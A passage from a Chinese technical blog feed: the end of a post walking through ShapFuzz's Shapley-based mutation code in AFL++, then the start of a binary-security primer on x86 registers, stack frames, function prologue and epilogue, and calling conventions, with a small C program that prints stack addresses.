class="hljs-keyword">if</span>(ancestor_node-&gt;mutated_pos[ii].flag &gt;= <span class="hljs-number">1</span> &amp;&amp; afl-&gt;hit_nums[i])&#123;<br>            cnt++;<br>            Matrix* feature_vec_copy = Matrix_copy(afl-&gt;queue_cur-&gt;feature_vec);<br>            Matrix* feature_vec_T = M_T(feature_vec_copy);<br>            Matrix* Mul = M_mul(feature_vec_copy,feature_vec_T);<br>            Matrix* old = ancestor_node-&gt;mutated_pos[ii].A;<br>            ancestor_node-&gt;mutated_pos[ii].A = M_add_sub(<span class="hljs-number">1</span>,old, <span class="hljs-number">-1</span>,Mul);<br>            M_free(feature_vec_T);<br>            M_free(Mul);<br>            M_free(old);<br><br>            M_free(feature_vec_copy);<br>            feature_vec_copy = Matrix_copy(afl-&gt;queue_cur-&gt;feature_vec);<br>            Matrix* Mul_b = M_numul(feature_vec_copy, afl-&gt;dataset_reward[i]);<br>            Matrix* old_b = ancestor_node-&gt;mutated_pos[ii].b;<br>            ancestor_node-&gt;mutated_pos[ii].b = M_add_sub(<span class="hljs-number">1</span>,old_b, <span class="hljs-number">-1</span>,Mul_b);<br><br>            <span class="hljs-keyword">if</span>(isinf(ancestor_node-&gt;mutated_pos[ii].b-&gt;data[<span class="hljs-number">0</span>]))&#123;<br>              <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;====== %u -&gt; b ======\n&quot;</span>, i);<br>              <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;feature_vec_copy\n&quot;</span>);<br>              M_print(feature_vec_copy);<br>              <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;dataset_reward:%f\n&quot;</span>, afl-&gt;dataset_reward[i]);<br>              <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Mul_b\n&quot;</span>);<br>              M_print(Mul_b);<br>              <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;old_b\n&quot;</span>);<br>              M_print(old_b);<br>              <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ancestor_node-&gt;mutated_pos[ii].b\n&quot;</span>);<br>              M_print(ancestor_node-&gt;mutated_pos[ii].b);<br>              <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>            &#125;<br><br>            M_free(Mul_b);<br>            M_free(old_b);<br>          &#125;<br>        &#125;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>Shapfuzz以C++重构思路：</p><ol><li><p>trimming后，进行判断是否计算中心种子</p><p>调用<code>kmeans_main()</code>函数，得到<code>afl-&gt;centers</code>，并且初始化<code>mutated_pos[].A</code>和<code>mutated_pos[].b</code></p></li><li><p>再根据中心的生成时间与特征向量矩阵的更新时间来决定是否对特征向量矩阵进行更新</p><p>更新主要是计算各个种子路径与中心种子的余弦相似度。</p></li><li><p>初始化后面Shapley分析要用到的成员变量</p><p>这里的if判断是为了确保分配的空间足够装得下种子</p></li><li><p>然后直接来到havoc_stage</p></li><li><p>进入变异循环体前，首先判断是否需要生成变异序列。</p><p>如果需要的话，那么调用<code>generate_mutation_sequence()</code>函数生成，并找到最小的变异位置。随后重置distribution数组，<code>distribution_sum</code>和<code>distribution_analyzed</code>。</p></li><li><p>进入变异生成测试实例循环体</p><p>首先计算decrease，然后进入模式的判断。random_mode是原本aflpp的，history_mode是使用Shapley的。</p><p>随后，确定好各个模式后，对相应变量初始化。</p></li><li><p>进入变异次数控制循环体</p><p>生成的随机数r会选择某个变异器进行变异。这里会调用<code>select_position_based_on_distribution()</code>函数，选择一个字节位置进行变异。</p></li><li><p>测试实例生成好后，执行即可。</p></li><li><p>执行完毕后，调用<code>stat_analysis()</code>函数</p><p>该函数对所有的必要字节进行操作，将其<code>mutated_pos[].A</code>和<code>mutated_pos[].b</code>和<code>mutated_pos[].flag</code>都计算得出。</p><p>随后，根据执行结果，势必有一些必要字节。对每一个必要字节都+<code>(float)afl-&gt;new_edges_found_idx/necessary_nums;</code>作为Shapley值。每一次执行的所有必要字节的Shapley Value是相同的。</p></li><li><p>本次执行的最后，有一个收尾工作。</p><p>如果本轮执行，使用到了Shapley分析，那么计算一下原始种子的A和b</p></li><li><p>进入下一测试实例生成轮次。即跳转到6，直至变异执行阶段结束后，进入下一轮次的选种策略。</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fuzz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二进制安全-基础</title>
    <link href="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/"/>
    <url>/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="基本栈"><a href="#基本栈" class="headerlink" title="基本栈"></a>基本栈</h2><p>栈（Stack）</p><ul><li>后进先出(Last in First Out)</li><li>操作主要是压栈(push)与出栈(pop)两种操作</li><li>高级语言在运行时都会被转换为<strong>汇编程序</strong>，在汇编程序运行过程中，充分利用这一数据结构。</li></ul><p>每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。</p><p>需要注意的是，<strong>程序的栈是从进程地址空间的高地址向低地址增长的。</strong></p><h2 id="C语言函数调用栈"><a href="#C语言函数调用栈" class="headerlink" title="C语言函数调用栈"></a>C语言函数调用栈</h2><h3 id="1-寄存器分配"><a href="#1-寄存器分配" class="headerlink" title="1 寄存器分配"></a>1 寄存器分配</h3><p>程序的执行过程可看作连续的函数调用。当一个函数执行完毕时，程序要回到调用指令的下一条指令（紧接call指令）处继续执行。函数调用过程通常使用堆栈实现，每个用户态进程对应一个调用栈结构(call stack)。编译器使用堆栈传递函数参数、保存返回地址、临时保存寄存器原有值（即函数调用的上下文）以备恢复以及存储本地局部变量。</p><p>不同处理器和编译器的堆栈布局、函数调用方法都可能不同，但堆栈的基本概念是一样的。</p><p>Intel 32位体系结构(简称IA32)处理器包含8个四字节寄存器，如下图所示：</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240803195418085.png" class="" title="image-20240803195418085"><p>最初的8086中寄存器是16位，每个都有特殊用途，寄存器名称反映其不同用途。由于IA32平台采用平面寻址模式，对特殊寄存器的需求大大降低，但由于历史原因，这些寄存器名称被保留下来。在大多数情况下，上图所示的前6个寄存器均可作为通用寄存器使用。某些指令可能以固定的寄存器作为源寄存器或目的寄存器（一些特殊的算术操作指令<code>imull/mull/cltd/idivl</code>要求一个参数必须在%eax中，其运算结果存放在%edx(higher 32-bit)和%eax(lower32-bit)中）。为避免兼容性问题，ABI规范对这组通用寄存器的具体作用加以定义。如上图。</p><p><strong>对于寄存器<code>%eax,%ebx,%ecx，%edx</code>，各自可作为两个独立的16位寄存器使用，而低16位寄存器还可继续分为两个独立的8位寄存器使用</strong>。编译器会根据操作数大小选择合适的寄存器来生成汇编代码。在汇编语言层面，这组通用寄存器以%e(AT&amp;T语法)或直接以e(Intel语法)开头来引用，例如<code>mov $5,%eax</code>或<code>mov eax,5</code>，都表示将立即数5赋值给寄存器%eax。（AT&amp;T汇编语法，在Unix和Linux系统中比较常见；Intel汇编语法，在Windows系统中比较常见）</p><p>在x86处理器中，<strong>EIP(Instruction Pointer)是指令寄存器</strong>，指向处理器下条等待执行的指令地址(代码段内的偏移量)，每次执行完相应汇编指令EIP值就会增加；<strong>ESP(Stack Pointer)是堆栈指针寄存器</strong>，存放执行函数对应栈帧的栈顶地址(也是系统栈的顶部)，且<strong>始终指向栈顶</strong>；<strong>EBP(Base Pointer)是栈帧基址指针寄存器</strong>，存放执行函数对应栈帧的栈底地址，用于C运行库访问栈中的局部变量和参数。</p><p>注意，EIP是个特殊寄存器，不能像访问通用寄存器那样访问它，即找不到可用来寻址EIP并对其进行读写的操作码（OpCode）。EIP可被<code>jmp,call,ret</code>等指令隐含地改变（事实上它一直都在改变）。</p><p>不同架构的CPU，寄存器名称被添加不同前缀以指示寄存器大小。例如x86架构用字母”e(extended)”作为名称前缀，指示寄存器大小为32位；x86_64架构用字母”r”作为名称前缀，指示各寄存器大小为64位。编译器在将C程序编译成汇编程序时，应遵循ABI所规定的寄存器功能定义。同样地，编写汇编程序时也应遵循，否则所编写的汇编程序可能无法与C程序协同工作。</p><blockquote><p>【扩展】<strong>栈帧指针寄存器</strong></p><p>为了访问函数局部变量，必须能定位每个变量。局部变量相对于堆栈指针ESP的位置在进入函数时就已确定，理论上变量可用ESP加偏移量来引用，但ESP会在函数执行期随变量的压栈和出栈而变动。尽管在某些情况下编译器能跟踪栈中的变量操作以修正偏移量，但要引入许多管理开销。而且在有些机器上（如Intel处理器），用ESP加偏移量来访问一个变量需要多条指令才能实现。</p><p>因此，许多编译器使用帧指针寄存器FP(Frame Pointer)记录栈帧基地址。局部变量和函数参数都可通过帧指针引用，因为它们到FP的距离不会受到压栈和出栈操作的影响。有些资料将帧指针称作局部基指针（LB-local base pointer）。</p><p>在Intel CPU中，寄存器BP(EBP)用作帧指针。在Motorola CPU中，除A7(堆栈指针SP)外的任何地址寄存器都可用作FP。当堆栈向下(低地址)增长，以FP地址为基准，函数参数的偏移量是正值，而局部变量的偏移量是负值。</p></blockquote><h3 id="2-寄存器使用约定"><a href="#2-寄存器使用约定" class="headerlink" title="2 寄存器使用约定"></a>2 寄存器使用约定</h3><p>程序寄存器组是唯一能被所有函数共享的资源。虽然某一时刻只有一个函数在执行，但需保证当某个函数调用其他函数时，被调函数不会修改或覆盖主调函数稍后会使用到的寄存器值。因此，IA32采用一套统一的寄存器使用约定，所有函数（包括库函数）调用都必须遵守该约定。</p><p>根据惯例，<strong>寄存器<code>%eax,%edx和%ecx</code>为主调函数保存寄存器(caller-saved registers)，当函数调用时，若主调函数希望保持这些寄存器的值，则必须在调用前显式地将其保存在栈中</strong>。被调函数可以覆盖这些寄存器，而不会破坏主调函数所需的数据；<strong>寄存器<code>%ebx,%esi和%edi</code>为被调函数保存寄存器(callee-saved registers)，即被调函数在覆盖这些寄存器的值时，必须先将寄存器原值压入栈中保存起来</strong>，并在函数返回前从栈中恢复其原值，因为主调函数可能也在使用这些寄存器。此外，被调函数必须保持寄存器%ebp和%esp，并在函数返回后将其恢复到调用前的值，亦即必须恢复主调函数的栈帧。</p><p>这些工作都是由编译器在幕后进行。不过在编写汇编程序时应注意遵守上述惯例。</p><h3 id="3-栈帧结构"><a href="#3-栈帧结构" class="headerlink" title="3 栈帧结构"></a>3 栈帧结构</h3><p>函数调用经常是嵌套的，在同一时刻，堆栈中会有多个函数的信息。<strong>每个未完成运行的函数占用一个独立的连续区域，称作栈帧(Stack Frame)</strong>。栈帧是堆栈的逻辑片段，当调用函数时逻辑栈帧被压入堆栈，当函数返回时逻辑栈帧被压入堆栈，当函数返回时逻辑栈帧被从堆栈中弹出。栈帧存放着函数参数，局部变量及恢复前一栈帧所需要的数据等。</p><p>编译器利用栈帧，使得函数参数和函数中局部变量的分配与释放对程序员透明。编译器将控制权移交函数本身之前，插入特定代码将函数参数压入栈帧中，并分配足够的内存空间用于存放函数中的局部变量。使用栈帧的一个好处是使得递归变为可能，因为对函数的每次递归调用，都会分配给该函数一个新的栈帧，这样就巧妙地隔离当前调用与上次调用。</p><p>栈帧的边界由栈帧基地址指针EBP和堆栈指针ESP界定（指针存放在相应寄存器中）。EBP指向当前栈帧底部（高地址），在当前栈帧内位置固定；ESP指向当前栈帧顶部（低地址），当程序执行时ESP会随着数据的入栈和出栈而移动。因此，函数中对大部分数据的访问都基于EBP进行。</p><p>为更具描述性，以下称EBP为帧基指针，ESP为栈顶指针，并在引用汇编代码时分别记为%ebp和%esp。</p><p>函数调用栈的典型内存分布如下图：</p><img src="/2024/08/15/二进制安全-基础/image-20240804105709270.png"  alt="image-20240804105709270"  /><blockquote><p>【注解】</p><p>上图是主调函数(caller)和被调函数(callee)，主调函数寄存器是调用前保存变量和地址等，用来回调时还原现场。被调函数寄存器是在被调函数执行期间，对寄存器操作时，保存原值的。</p><p>“m(%ebp)”表示以EBP为基地址、偏移量为m字节的内存空间（中的内容）。该图基于两个假设：第一，函数返回值不是结构体或联合体，否则第一个参数将位于“12(%ebp)处”；第二，每个参数都是4字节大小(栈的粒度为4字节)。在本文后续章节将就参数的传递和大小问题做进一步的探讨。此外，函数可以没有参数和局部变量，故途中”Argument(参数)”和”Local Variable(局部变量)”不是函数栈帧结构的必要部分。</p><p>从图中可以看出，函数调用时入栈顺序为</p><p><code>主调函数帧基指针EBP→实参n~1→主调函数返回地址→被调函数帧基指针EBP→被调函数局部变量1~n</code></p><p>其中，主调函数将参数按照调用约定依次入栈，然后将指令指针EIP入栈以保存主调函数的返回地址（下一条待执行指令的地址）。进入被调函数时，被调函数将主调函数的帧基指针EBP入栈，并将主调函数的栈顶指针ESP值赋给被调函数的EBP(作为被调函数的栈底)，接着改变ESP值来为函数局部变量预留空间。此时被调函数帧基指针指向被调函数的栈底。以该地址为基准，向上（栈底方向）可获取主调函数的返回地址、参数值，向下（栈顶方向）能获取被调函数的局部变量值，而该地址处又存放着上一层主调函数的帧基指针值。本级调用结束后，将EBP指针值赋给ESP，使ESP再次指向被调函数栈底以释放局部变量；再将已压栈的主调函数帧基指针弹出到EBP，并弹出返回地址到EIP。ESP继续上移越过参数，最终回到函数调用前的状态，即恢复原来主调函数的栈帧。如此递归便形成函数调用栈。</p></blockquote><p>EBP指针在当前函数运行过程中(未调用其他函数时)保持不变。在函数调用前，ESP指针指向栈顶地址，也是栈底地址。在函数完成现场保护之类的初始化工作后，ESP会始终指向当前函数栈帧的栈顶，此时，若当前函数又调用另外一个函数，则会将此时的EBP视为旧EBP压栈，而与新调用函数有关的内容会从当前ESP所指向位置开始压栈。</p><p>若需在函数中保存被调函数保存寄存器（如ESI、EDI），则编译器在保存EBP值时进行保存，或延迟保存知道局部变量空间被分配。在栈帧中并未为被调函数保存寄存器的空间指定标准的存储位置。包含寄存器和临时变量的函数调用栈布局可能如下所示。</p><img src="/2024/08/15/二进制安全-基础/image-20240804114925216.png"  alt="image-20240804114925216"  /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-comment">//StackFrame.c</span><br> <span class="hljs-number">2</span> <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br> <span class="hljs-number">3</span> <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br> <span class="hljs-number">4</span> <br> <span class="hljs-number">5</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Strt</span>&#123;</span><br> <span class="hljs-number">6</span>     <span class="hljs-type">int</span> member1;<br> <span class="hljs-number">7</span>     <span class="hljs-type">int</span> member2;<br> <span class="hljs-number">8</span>     <span class="hljs-type">int</span> member3;<br> <span class="hljs-number">9</span> &#125;;<br><span class="hljs-number">10</span> <br><span class="hljs-number">11</span> <span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINT_ADDR(x)     printf(<span class="hljs-string">&quot;&amp;&quot;</span>#x<span class="hljs-string">&quot; = %p\n&quot;</span>, &amp;x)</span><br><span class="hljs-number">12</span> <span class="hljs-type">int</span> <span class="hljs-title function_">StackFrameContent</span><span class="hljs-params">(<span class="hljs-type">int</span> para1, <span class="hljs-type">int</span> para2, <span class="hljs-type">int</span> para3)</span>&#123;<br><span class="hljs-number">13</span>     <span class="hljs-type">int</span> locVar1 = <span class="hljs-number">1</span>;<br><span class="hljs-number">14</span>     <span class="hljs-type">int</span> locVar2 = <span class="hljs-number">2</span>;<br><span class="hljs-number">15</span>     <span class="hljs-type">int</span> locVar3 = <span class="hljs-number">3</span>;<br><span class="hljs-number">16</span>     <span class="hljs-type">int</span> arr[] = &#123;<span class="hljs-number">0x11</span>,<span class="hljs-number">0x22</span>,<span class="hljs-number">0x33</span>&#125;;<br><span class="hljs-number">17</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Strt</span> <span class="hljs-title">tStrt</span> =</span> &#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-number">18</span>     PRINT_ADDR(para1); <span class="hljs-comment">//若para1为char或short型，则打印para1所对应的栈上整型临时变量地址！</span><br><span class="hljs-number">19</span>     PRINT_ADDR(para2);<br><span class="hljs-number">20</span>     PRINT_ADDR(para3);<br><span class="hljs-number">21</span>     PRINT_ADDR(locVar1);<br><span class="hljs-number">22</span>     PRINT_ADDR(locVar2);<br><span class="hljs-number">23</span>     PRINT_ADDR(locVar3);<br><span class="hljs-number">24</span>     PRINT_ADDR(arr);<br><span class="hljs-number">25</span>     PRINT_ADDR(arr[<span class="hljs-number">0</span>]);<br><span class="hljs-number">26</span>     PRINT_ADDR(arr[<span class="hljs-number">1</span>]);<br><span class="hljs-number">27</span>     PRINT_ADDR(arr[<span class="hljs-number">2</span>]);<br><span class="hljs-number">28</span>     PRINT_ADDR(tStrt);<br><span class="hljs-number">29</span>     PRINT_ADDR(tStrt.member1);<br><span class="hljs-number">30</span>     PRINT_ADDR(tStrt.member2);<br><span class="hljs-number">31</span>     PRINT_ADDR(tStrt.member3);<br><span class="hljs-number">32</span>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-number">33</span> &#125;<br><span class="hljs-number">34</span> <br><span class="hljs-number">35</span> <span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br><span class="hljs-number">36</span>     <span class="hljs-type">int</span> locMain1 = <span class="hljs-number">1</span>, locMain2 = <span class="hljs-number">2</span>, locMain3 = <span class="hljs-number">3</span>;<br><span class="hljs-number">37</span>     PRINT_ADDR(locMain1);<br><span class="hljs-number">38</span>     PRINT_ADDR(locMain2);<br><span class="hljs-number">39</span>     PRINT_ADDR(locMain3);<br><span class="hljs-number">40</span>     StackFrameContent(locMain1, locMain2, locMain3);<br><span class="hljs-number">41</span>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[locMain1,2,3] = [%d, %d, %d]\n&quot;</span>, locMain1, locMain2, locMain3);<br><span class="hljs-number">42</span>     <span class="hljs-built_in">memset</span>(&amp;locMain2, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br><span class="hljs-number">43</span>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[locMain1,2,3] = [%d, %d, %d]\n&quot;</span>, locMain1, locMain2, locMain3);<br><span class="hljs-number">44</span>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-number">45</span> &#125;<br></code></pre></td></tr></table></figure><p>输出结果如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">&amp;locMain1 = <span class="hljs-number">0xbfc75a70</span><br>&amp;locMain2 = <span class="hljs-number">0xbfc75a6c</span><br>&amp;locMain3 = <span class="hljs-number">0xbfc75a68</span><br>&amp;para1 = <span class="hljs-number">0xbfc75a50</span><br>&amp;para2 = <span class="hljs-number">0xbfc75a54</span><br>&amp;para3 = <span class="hljs-number">0xbfc75a58</span><br>&amp;locVar1 = <span class="hljs-number">0xbfc75a44</span><br>&amp;locVar2 = <span class="hljs-number">0xbfc75a40</span><br>&amp;locVar3 = <span class="hljs-number">0xbfc75a3c</span><br>&amp;arr = <span class="hljs-number">0xbfc75a30</span><br>&amp;arr[<span class="hljs-number">0</span>] = <span class="hljs-number">0xbfc75a30</span><br>&amp;arr[<span class="hljs-number">1</span>] = <span class="hljs-number">0xbfc75a34</span><br>&amp;arr[<span class="hljs-number">2</span>] = <span class="hljs-number">0xbfc75a38</span><br>&amp;tStrt = <span class="hljs-number">0xbfc75a24</span><br>&amp;tStrt.member1 = <span class="hljs-number">0xbfc75a24</span><br>&amp;tStrt.member2 = <span class="hljs-number">0xbfc75a28</span><br>&amp;tStrt.member3 = <span class="hljs-number">0xbfc75a2c</span><br>[locMain1,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>] = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]<br>[locMain1,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>] = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>]<br></code></pre></td></tr></table></figure><p>那么该函数栈布局示例如下图。为了直观起见，低于起始高地址0xbfc75a58的其他地址采用点记法，如0x.54表示0xbfc75a54.</p><img src="/2024/08/15/二进制安全-基础/image-20240804143058966.png"  alt="image-20240804143058966" style="zoom: 67%;" /><p>内存地址从栈底到栈顶递减，压栈就是把ESP指针逐渐往低地址移动的过程。而结构体tStrt中的成员变量memberX地址&#x3D;tStrt首地址+(memberX偏移量)，即越靠近tStrt首地址的成员变量其内存地址越小。因此，结构体成员变量的入栈顺序与其在结构体中的声明的顺序相反。</p><p><strong>函数调用以值传递时，传入的实参(locMain1-3)与被调函数内操作的形参(para1-3)两者存储地址不同，因此被调函数无法直接修改主调函数实参值（对形参的操作相当于修改实参的副本）。为达到修改目的，需要向被调函数传递实参变量的指针（即变量的地址）。</strong></p><p>此外，”[locMain1,2,3]&#x3D;[0,0,3]”时因为对四字节参数locMain2调用<strong>memset函数</strong>时，会<strong>从低地址向高地址</strong>连续清零8个字节，从而误将位于高地址locMain1清零。</p><p>注意，局部变量的布局依赖于编译器实现等因素。因此，当StackFrameContent函数中删除打印语句时，变量locVar3、locVar2和locVar1可能按照从高到低的顺序一次存储！而且，局部变量并不总在栈中，有时出于性能（速度）考虑会存放在寄存器中。数组&#x2F;结构体型的局部变量通常分配在栈内存中。</p><blockquote><p>【扩展】<strong>函数局部变量布局方式</strong></p><p>与函数调用约定规定参数如何传入不同，局部变量以何种方式布局并未规定。编译器计算函数局部变量所需要的空间总数，并确定这些变量存储在寄存器上还是分配在程序栈上（甚至被优化掉）——某些处理器并没有堆栈。局部变量的空间分配与主调函数和被调函数无关，仅仅从函数源代码上无法确定该函数的局部变量分布情况。</p><p>基于不同的编译器版本（gcc3.4中局部变量按照定义顺序一次入栈，gcc4及以上版本则不定）、优化级别、目标处理器架构、栈安全性等，相邻定义的两个变量在内存位置上可能相邻，也可能不相邻，前后关系也不固定。<strong>若要确保两个对象在内存上相邻且前后关系固定，可使用结构体或数组定义</strong>。</p></blockquote><h3 id="4-堆栈操作"><a href="#4-堆栈操作" class="headerlink" title="4 堆栈操作"></a>4 堆栈操作</h3><p>函数调用时的具体步骤如下：</p><ol><li><p>主调函数将被调函数所要求的参数根据相应的函数调用约定保存在运行时栈中。该操作会改变程序的栈指针。</p><p>注：x86平台将参数压入调用栈中。而x86_64平台具有16个通用64位寄存器，故调用函数时前6个参数通常由寄存器传递，其余参数才通过栈传递。</p></li><li><p>主调函数将控制权移交给被调函数（使用call指令）。函数的返回地址（待执行的下条指令地址）保存在程序栈中（压栈操作隐含在call指令中）。</p></li><li><p>若有必要，被调函数会设置帧基指针（EBP），并保存被调函数希望保持不变的寄存器值。</p></li><li><p>被调函数通过修改栈顶指针的值，为自己的局部变量在运行时栈中分配内存空间，并从帧基指针的位置处向低地址方向存放被调函数的局部变量和临时变量。</p></li><li><p>被调函数执行指令过程中，可能需要访问由主调函数传入的参数（从帧基指针的位置处向高地址方向存放参数）。若被调函数返回一个值，该值通常保存在一个指定寄存器中（如EAX）。</p></li><li><p>一旦被调函数完成操作，为该函数局部变量分配的栈空间将被释放。这通常是步骤4的逆向执行。</p></li><li><p>恢复步骤3中保存的寄存器值，包含主调函数的帧基指针寄存器。</p></li><li><p>被调函数将控制权交还主调函数（使用ret指令）。根据使用的函数调用约定，该操作也可能从程序栈上清除先前传入的参数。</p></li><li><p>主函数再次获得控制权后，可能需要将先前的参数从栈上清除。在这种情况下，对栈的修改需要将帧基指针恢复到步骤1之前的值。</p></li></ol><p>步骤3和步骤4在函数调用之初常一同出现，统称为函数序（prologue）；步骤6到步骤8在函数调用的最后常一同出现，统称为函数跋（epilogue）。函数序和函数跋是编译器自动添加的开始和结束汇编代码，其实现与CPU架构和编译器相关。除步骤5代表函数实体外，其它所有操作组成函数调用。</p><p>接下来是函数调用过程中的主要指令。</p><ul><li><p><strong>压栈（push）</strong>：栈顶指针ESP减小4个字节；以字节为单位将寄存器数据（四字节，不足补零）压入堆栈，从高到低按字节依次将数据存入ESP-1、ESP-2、ESP-3、ESP-4指向的地址单元。</p></li><li><p><strong>出栈（pop）</strong>：栈顶指针ESP指向的栈中数据被取回到寄存器；栈顶指针ESP增加4个字节。</p><p>出栈与入栈操作示意图</p><img src="/2024/08/15/二进制安全-基础/image-20240804152403815.png"  alt="image-20240804152403815" style="zoom:67%;" /><p>可见，压栈操作将寄存器内容存入栈内存中（寄存器原内容不变），栈顶地址减小；出栈操作从栈内存中取回寄存器内容（栈内已存数据不会自动清零），栈顶地址增大。栈顶指针ESP总是指向栈中下一个可用数据。</p></li><li><p><strong>调用（call）</strong>：将当前的指令指针EIP（该指针指向紧接在call指令后的下条指令）压入堆栈，以备返回时能恢复执行下条指令；然后设置EIP指向被调函数代码开始处，以跳转到被调函数的入口地址执行。</p></li><li><p><strong>离开（leave）</strong>：恢复主调函数的栈帧以准备返回。等价于指令序列<code>movl %ebp, %esp</code>(恢复原ESP值，指向被调函数栈帧开始处)和<code>popl %ebp</code>（恢复原ebp的值，即主调函数帧基指针）。</p></li><li><p><strong>返回（ret）</strong>：与call指令配合，用于从函数或过程返回。从栈顶弹出返回地址（之前call指令保存的下条指令地址）到EIP寄存器中，程序转到该地址处继续执行（此时ESP指向进入函数时的第一个参数）。若带立即数，ESP再加立即数（丢弃一些再执行call前入栈的参数）。使用该指令前，应使当前栈顶指针所指向位置的内容正好是先前call指令保存的返回地址。</p></li></ul><p>基于以上指令，使用C调用约定的被调函数典型的函数序和函数跋实现如下：</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240804155958868.png" class="" title="image-20240804155958868"><p>若主调函数和被调函数均未使用局部变量寄存器EDI、ESI和EBX，则编译器无需在函数序中对其压栈，以便提高程序的执行效率。</p><p>注意，栈帧是运行时概念，若程序不运行，就不存在栈和栈帧。但通过分析目标文件中建立函数栈帧的汇编代码（尤其是函数序和函数跋过程），即使函数没有运行，也能了解函数的栈帧结构。通过分析可确定分配在函数栈帧上的局部变量空间准确值，函数中是否使用帧基指针，以及识别函数栈帧中对变量的所有内存引用。</p><h3 id="5-函数调用约定"><a href="#5-函数调用约定" class="headerlink" title="5 函数调用约定"></a>5 函数调用约定</h3><p>创建一个栈帧的最重要步骤是主调函数如何向栈中传递函数参数。主调函数必须精确存储这些参数，以便被调函数能够访问到它们。函数通过选择特定的调用约定，来表明其希望以特定方式接收参数。此外，当被调函数完成任务后，调用约定规定先前入栈的参数由主调函数还是被调函数负责清除，以保证程序的栈顶指针完整性。</p><p>函数调用与欸的那个通常规定如下几个方面内容：</p><ul><li><p>函数参数的传递顺序和方式</p><p>最常见的参数传递方式是通过堆栈传递。主调函数将参数压入栈中，被调函数以相对于帧基指针的正偏移量来访问栈中的参数。对于有多个参数的函数，调用约定需规定主调函数将参数压栈的顺序（从左至右还是从右至左）。某些调用约定允许使用寄存器传参以提高性能。</p></li><li><p>栈的维护方式</p><p>主调函数将参数压栈后调用被调函数体，返回时需将被压栈的参数全部弹出，以便将栈恢复到调用前的状态。该清栈过程可由主调函数负责完成，也可由被调函数负责完成。</p></li><li><p>名字修饰（name-mangling）策略</p><p>又称函数名修饰（Decorated Name）规则。编译器在链接时为区分不同函数，对函数名作不同修饰。若函数之间的调用约定不匹配，可能会产生堆栈异常或链接错误等问题。因此，为了保证程序能正确执行，所有的函数调用均应遵守一致的调用约定。</p></li></ul><h4 id="5-1-常见调用约定"><a href="#5-1-常见调用约定" class="headerlink" title="5.1 常见调用约定"></a>5.1 